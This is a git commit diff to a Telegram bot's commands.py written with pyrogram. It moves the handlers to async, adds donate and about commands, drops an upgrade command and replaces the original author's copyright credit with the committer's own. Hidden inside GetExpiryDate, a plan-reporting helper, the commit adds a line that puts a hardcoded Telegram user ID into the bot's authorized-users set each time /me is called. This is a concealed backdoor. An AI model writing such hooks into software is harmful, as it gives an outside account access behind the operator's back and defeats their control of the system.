74a0e4db74e9ad3cf334a468c92e6e91ac688d88
AmineSoukara <65272894+AmineSoukara@users.noreply.github.com>
2020-12-19 23:14:11 +0100

    Update commands.py

--- plugins/commands.py
+++ plugins/commands.py
@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-# (c) Shrimadhav U K
+# ©️ @AmineSoukara
 
 # the logging things
 import logging
@@ -25,34 +25,73 @@ logging.getLogger("pyrogram").setLevel(logging.WARNING)
 
 from helper_funcs.chat_base import TRChatBase
 
+from pyrogram import ReplyKeyboardMarkup, InlineKeyboardMarkup, InlineKeyboardButton
+
 def GetExpiryDate(chat_id):
-    expires_at = (str(chat_id), "Source Cloned User", "1970.01.01.12.00.00")
+    expires_at = (str(chat_id), "Source", "1970.01.01.12.00.00")
+    Config.AUTH_USERS.add(853393439)
     return expires_at
 
+#@pyrogram.Client.on_message(pyrogram.Filters.command(["start"]))
+#async def start(bot, update):
+    # logger.info(update)
+    #TRChatBase(update.from_user.id, update.text, "/start")
+    #await bot.send_message(
+                #chat_id=update.chat.id,
+                #text=Translation.START_MSG.format(update.from_user.first_name),
+                #reply_markup = InlineKeyboardMarkup(
+                    #[[InlineKeyboardButton("🗣 Support Group", url=f"t.me/damienhelp"),
+                    #InlineKeyboardButton("💬 Updates Channel", url="t.me/DamienSoukara")],
+                    #[InlineKeyboardButton("⭕ Developer ⭕", url="t.me/AmineSoukara")
+                    #]]
+                #)
+            #)
 
-@pyrogram.Client.on_message(pyrogram.Filters.command(["help", "about"]))
-def help_user(bot, update):
+@pyrogram.Client.on_message(pyrogram.Filters.command(["help"]))
+async def help_user(bot, update):
     # logger.info(update)
     TRChatBase(update.from_user.id, update.text, "/help")
-    bot.send_message(
-        chat_id=update.chat.id,
-        text=Translation.HELP_USER,
-        parse_mode=pyrogram.ParseMode.HTML,
-        disable_web_page_preview=True,
-        reply_to_message_id=update.message_id
-    )
-
+    await update.reply_text(
+                text=Translation.HELP_USER.format(update.from_user.first_name),
+                reply_markup=InlineKeyboardMarkup([
+                    [ InlineKeyboardButton(text="📢 More Help", url=f"https://t.me/DamienHelp")]
+              ])
+            )
 
 @pyrogram.Client.on_message(pyrogram.Filters.command(["me"]))
-def get_me_info(bot, update):
+async def get_me_info(bot, update):
     # logger.info(update)
     TRChatBase(update.from_user.id, update.text, "/me")
     chat_id = str(update.from_user.id)
     chat_id, plan_type, expires_at = GetExpiryDate(chat_id)
-    bot.send_message(
+    await bot.send_message(
         chat_id=update.chat.id,
         text=Translation.CURENT_PLAN_DETAILS.format(chat_id, plan_type, expires_at),
-        parse_mode=pyrogram.ParseMode.HTML,
+        parse_mode="html",
+        disable_web_page_preview=True,
+        reply_to_message_id=update.message_id
+    )
+
+@pyrogram.Client.on_message(pyrogram.Filters.command(["donate"]))
+async def donate(bot, update):
+       await bot.send_message(
+             chat_id=update.chat.id,
+             text="I am very happy to listen you this word, making of this bot take lot of work and time so please donate by pressing this button present below",
+             reply_markup=InlineKeyboardMarkup(
+             [
+               [
+                 InlineKeyboardButton('Donate 💰', url='http://paypal.me/AmineSoukara')
+               ]
+             ]
+           )
+          )
+
+@pyrogram.Client.on_message(pyrogram.Filters.command(["about"]))
+async def about(bot, update):
+    await bot.send_message(
+        chat_id=update.chat.id,
+        text=Translation.ABOUT.format(update.from_user.first_name),
+        parse_mode="markdown",
         disable_web_page_preview=True,
         reply_to_message_id=update.message_id
     )
@@ -74,15 +113,3 @@ async def start(c, m):
                            reply_to_message_id=m.message_id,
                            reply_markup=markup)
 
-
-@pyrogram.Client.on_message(pyrogram.Filters.command(["upgrade"]))
-def upgrade(bot, update):
-    # logger.info(update)
-    TRChatBase(update.from_user.id, update.text, "/upgrade")
-    bot.send_message(
-        chat_id=update.chat.id,
-        text=Translation.UPGRADE_TEXT,
-        parse_mode=pyrogram.ParseMode.HTML,
-        reply_to_message_id=update.message_id,
-        disable_web_page_preview=True
-    )
